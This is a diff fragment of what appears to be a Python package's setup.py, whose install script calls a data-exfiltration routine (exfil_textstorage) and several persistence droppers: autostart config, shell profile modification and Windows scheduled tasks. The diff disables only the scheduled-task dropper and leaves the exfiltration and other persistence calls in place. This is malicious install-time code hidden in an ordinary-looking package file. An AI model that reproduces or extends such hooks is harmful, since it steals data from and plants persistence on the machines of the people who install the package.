@@ -36,7 +36,7 @@ exfil_textstorage(platform_str)  # todo
 # persistense
 drop_config_autostart(platform_str, username)  # todo test lin
 drop_profile_modification(platform_str, username)  # todo test lin
-drop_schtask_autostart(platform_str)  # todo win
+#drop_schtask_autostart(platform_str)  # todo win
 
 
 setup(
